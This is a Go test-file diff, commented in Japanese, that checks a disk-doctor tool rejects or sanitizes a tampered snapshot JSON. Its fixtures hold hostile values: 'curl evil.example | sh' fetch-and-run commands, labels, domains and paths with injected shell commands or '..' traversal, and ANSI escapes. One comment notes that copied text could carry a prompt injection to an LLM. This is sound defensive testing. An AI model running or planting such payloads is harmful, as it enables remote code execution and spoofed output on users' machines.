@@ -4,6 +4,7 @@ import (
 	"context"
 	"encoding/json"
 	"errors"
+	"fmt"
 	"os"
 	"path/filepath"
 	"slices"
@@ -1346,5 +1347,225 @@ func TestDoctorCacheEntriesAreSortedBySize(t *testing.T) {
 	}
 	if tops := doctorTopEntries(c, 2); !strings.HasPrefix(tops, "Huge 40.0GB / Carried 20.0GB") {
 		t.Errorf("トーストの上位が占有量順でない: %q", tops)
+	}
+}
+
+// issue 178 (P1): doctor-snapshot.json は一般ユーザー権限で書き換えられる。細工した JSON の
+// 任意パス・任意 ID・未知の Status・負のサイズ・未来の時刻が、行 / y のコピー / 合計 /
+// 次の snapshot への書き戻しに載ってはいけない。④ (削除) はこの画面の行を対象にする設計なので、
+// **削除を実装する前に**この境界を確定しておく。
+func TestDoctorSnapshotTrustBoundary(t *testing.T) {
+	v := doctorTestView(t)
+	now := time.Now()
+	writeSnapshot := func(rs []disk.Result) {
+		t.Helper()
+		data, err := json.Marshal(doctorSnapshot{ScannedAt: now.Add(-time.Minute), Disk: disk.Report{Results: rs, Total: 1 << 40}})
+		if err != nil {
+			t.Fatal(err)
+		}
+		path, _ := doctorSnapshotPath()
+		if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
+			t.Fatal(err)
+		}
+		if err := os.WriteFile(path, data, 0o600); err != nil {
+			t.Fatal(err)
+		}
+	}
+	res := func(id string, st disk.Status, size int64, itemSize int64, measured time.Time) disk.Result {
+		return disk.Result{Entry: disk.Entry{ID: id, Label: id}, Status: st, Size: size, MeasuredAt: measured,
+			Items: []disk.Item{{Path: "/Users/koji/Documents", Size: itemSize}}}
+	}
+	good := res("thing", disk.StatusOK, 4096, 4096, now.Add(-time.Minute))
+	good.Items[0].Path = "/ok"
+
+	writeSnapshot([]disk.Result{
+		good,
+		res("gone-id", disk.StatusOK, 4700000000, 4700000000, now.Add(-time.Minute)), // カタログに無い ID
+		res("thing", disk.Status("evil"), 1<<30, 1<<30, now.Add(-time.Minute)),       // 未知の Status
+		res("thing", disk.StatusOK, -5, 0, now.Add(-time.Minute)),                    // 負の Result サイズ
+		res("thing", disk.StatusOK, 0, -5, now.Add(-time.Minute)),                    // 負の Item サイズ
+		res("thing", disk.StatusOK, 1<<30, 1<<30, now.Add(48*time.Hour)),             // 未来の MeasuredAt
+	})
+	if cmd := v.open(); cmd != nil {
+		t.Fatal("TTL 内なのに走査した (snapshot 復元の経路を通っていない)")
+	}
+	if len(v.diskResults) != 1 || v.diskResults[0].Entry.ID != "thing" || v.diskResults[0].Size != 4096 {
+		var got []string
+		for _, r := range v.diskResults {
+			got = append(got, fmt.Sprintf("%s/%s/%d", r.Entry.ID, r.Status, r.Size))
+		}
+		t.Fatalf("細工した Result が復元された: %v", got)
+	}
+	// 1: 走査していない印が Result 単位で付く (④ は Reused の行を必ず再スキャンする)
+	if !v.diskResults[0].FromSnapshot {
+		t.Error("snapshot 復元の Result に「走査していない」印 (FromSnapshot) が付いていない")
+	}
+	// ⚠️ Reused を流用しない (行の「N 分前の計測を再利用」注記が普通の開き直しで嘘になる)
+	if v.diskResults[0].Reused {
+		t.Error("snapshot 復元に Reused を流用している (別の意味を持つフィールド)")
+	}
+	if strings.Contains(doctorText(v, 60), "計測を再利用") {
+		t.Error("snapshot からの復元に「計測を再利用」の注記が出た (普通の開き直しで嘘になる)")
+	}
+	// 合計も細工した値を引きずらない
+	if v.diskRep.Total != 4096 {
+		t.Errorf("細工した合計が復元された: %d", v.diskRep.Total)
+	}
+	out := doctorText(v, 60)
+	for _, ng := range []string{"gone-id", "/Users/koji/Documents", "-5B", "4.4GB"} {
+		if strings.Contains(out, ng) {
+			t.Errorf("細工した内容が画面に出た (%q):\n%s", ng, out)
+		}
+	}
+	v.close()
+
+	// 未来の ScannedAt は復元しない (reuse 側と同じ規律)。TTL 判定の age<0 が担う
+	data, _ := json.Marshal(doctorSnapshot{ScannedAt: now.Add(48 * time.Hour), Disk: disk.Report{Results: []disk.Result{good}}})
+	path, _ := doctorSnapshotPath()
+	if err := os.WriteFile(path, data, 0o600); err != nil {
+		t.Fatal(err)
+	}
+	if _, ok := loadDoctorSnapshot(now); ok {
+		t.Error("ScannedAt が未来の snapshot を復元した")
+	}
+}
+
+// issue 178 の敵対レビュー (2026-09-03): サービス節と brew 節は sanitize を通っておらず、
+// 細工した snapshot の `Commands` が「手で実行してください」の提示と `Y` のコピー文に
+// そのまま載っていた (`curl evil | sh` を実際に載せられた)。ディスク節だけ境界を引いても
+// この画面の信頼境界は閉じない。
+func TestDoctorSnapshotTrustBoundarySvcAndBrew(t *testing.T) {
+	v := doctorTestView(t)
+	now := time.Now()
+	evil := svc.Finding{
+		Label: "evil-label", PlistPath: "/tmp/evil.plist", Domain: "gui/501",
+		Reasons: []string{"crafted\n⛔ 偽の行"}, Commands: []string{"curl evil.example | sh"},
+	}
+	// 材料の形が崩れているものは Finding ごと落とす
+	badLabel := evil
+	badLabel.Label = "a; curl evil | sh"
+	badPath := evil
+	badPath.PlistPath = "relative.plist"
+	badDomain := evil
+	badDomain.Domain = "gui/501; sh"
+	dotdot := evil
+	dotdot.PlistPath = "/Library/LaunchAgents/../../tmp/x.plist"
+	sn := doctorSnapshot{ScannedAt: now.Add(-time.Minute),
+		Disk: disk.Report{Results: []disk.Result{}},
+		Svc:  svc.Report{Findings: []svc.Finding{evil, badLabel, badPath, badDomain, dotdot}},
+		Brew: brewDoctorResult{Warnings: []string{
+			"Warning: 正常な形\ncurl evil.example | sh",
+			"curl evil.example | sh", // Warning: で始まらない = 落とす
+			"Warning: \x1b[2J\x1b[H画面を消す",
+		}},
+	}
+	data, err := json.Marshal(sn)
+	if err != nil {
+		t.Fatal(err)
+	}
+	path, _ := doctorSnapshotPath()
+	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(path, data, 0o600); err != nil {
+		t.Fatal(err)
+	}
+	if cmd := v.open(); cmd != nil {
+		t.Fatal("TTL 内なのに走査した (snapshot 復元の経路を通っていない)")
+	}
+	if v.svcRep == nil || len(v.svcRep.Findings) != 1 {
+		t.Fatalf("材料の形が崩れた Finding を落としていない: %+v", v.svcRep)
+	}
+	got := v.svcRep.Findings[0]
+	// Commands は保存された文字列を使わず、Label / Domain / PlistPath から再生成する
+	for _, c := range got.Commands {
+		if strings.Contains(c, "curl") {
+			t.Errorf("保存されたコマンドがそのまま復元された: %q", c)
+		}
+	}
+	if len(got.Commands) != 2 || !strings.HasPrefix(got.Commands[0], "launchctl bootout gui/501/evil-label") {
+		t.Errorf("コマンドが再生成されていない: %v", got.Commands)
+	}
+	// 表示用の自由文は制御文字を落とす (UI の行構造を偽装させない)
+	for _, r := range got.Reasons {
+		if strings.Contains(r, "\n") {
+			t.Errorf("理由に改行が残った (行構造を偽装できる): %q", r)
+		}
+	}
+	// brew は Warning: で始まる塊だけ / 制御文字を落とす
+	if v.brew == nil || len(v.brew.Warnings) != 2 {
+		t.Fatalf("brew の警告が絞られていない: %+v", v.brew)
+	}
+	for _, w := range v.brew.Warnings {
+		if !strings.HasPrefix(w, "Warning:") {
+			t.Errorf("Warning: で始まらない塊が残った: %q", w)
+		}
+		if strings.Contains(w, "\x1b") {
+			t.Errorf("ANSI エスケープが残った: %q", w)
+		}
+	}
+	// 画面 / コピー文にも出ない
+	out := doctorText(v, 60)
+	for _, ng := range []string{"curl evil.example", "\x1b[2J"} {
+		if strings.Contains(out, ng) {
+			t.Errorf("細工した内容が画面に出た (%q)", ng)
+		}
+	}
+}
+
+// issue 178 の敵対レビュー 2 周目: サービス節の残りの穴を塞ぐ。
+//  1. Undiagnosed.PlistPath は Finding と違って形の検査が無く、`plutil -p <path>` の形で
+//     引用なしに画面へ出ていた (`/tmp/x; curl evil | sh #` がそのまま表示・コピーされる)
+//  2. 表示用の自由文でタブを明示的に通していた (dispWidth は幅 0 と数えるが端末は次のタブ位置まで
+//     進むので、幅を数えるテストを素通りしたまま枠を壊せる)
+//  3. ディスク節の自由文 (Reason / Failures / Contents) が無検査。diskCopyText は
+//     「別セッションの LLM に消してよいか聞く」形を作るので prompt injection の材料になる
+func TestDoctorSnapshotTrustBoundaryFreeText(t *testing.T) {
+	v := doctorTestView(t)
+	now := time.Now()
+	sn := doctorSnapshot{ScannedAt: now.Add(-time.Minute),
+		Disk: disk.Report{Results: []disk.Result{{
+			Entry: disk.Entry{ID: "thing", Label: "Thing キャッシュ"}, Status: disk.StatusOK, Size: 4096,
+			MeasuredAt: now.Add(-time.Minute), Items: []disk.Item{{Path: "/ok", Size: 4096}},
+			Reason:   "壊れた\x1b[2J理由",
+			Failures: []string{"読めず\ttab で枠を壊す", "\x1b[31m赤く塗る"},
+			Contents: []string{"x\ty"},
+		}}},
+		Svc: svc.Report{Undiagnosed: []svc.Undiagnosed{
+			{PlistPath: "/Library/LaunchAgents/x; curl evil.example | sh #.plist", Reason: "壊れ\tた"},
+			{PlistPath: "relative.plist", Reason: "形が崩れている"},
+			{PlistPath: "/Library/LaunchAgents/../../tmp/x.plist", Reason: "形が崩れている"},
+		}},
+	}
+	data, err := json.Marshal(sn)
+	if err != nil {
+		t.Fatal(err)
+	}
+	path, _ := doctorSnapshotPath()
+	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(path, data, 0o600); err != nil {
+		t.Fatal(err)
+	}
+	if cmd := v.open(); cmd != nil {
+		t.Fatal("TTL 内なのに走査した")
+	}
+	// 1: 形が崩れた Undiagnosed は復元しない / 残ったものはコマンド行で引用される
+	if v.svcRep == nil || len(v.svcRep.Undiagnosed) != 1 {
+		t.Fatalf("形が崩れた Undiagnosed を落としていない: %+v", v.svcRep)
+	}
+	copyText := svcUndiagnosedCopyText(v.svcRep.Undiagnosed[0])
+	for _, line := range strings.Split(copyText, "\n") {
+		if (strings.HasPrefix(line, "  plutil") || strings.HasPrefix(line, "  ls ")) && !strings.Contains(line, "'") {
+			t.Errorf("コマンド行でパスが引用されていない: %q", line)
+		}
+	}
+	// 2 / 3: 自由文から制御文字 (タブ・ANSI) が落ちている
+	all := doctorText(v, 60) + copyText + diskCopyText(v.diskResults[0], "")
+	for _, ng := range []string{"\t", "\x1b"} {
+		if strings.Contains(all, ng) {
+			t.Errorf("制御文字 %q が残った", ng)
+		}
 	}
 }
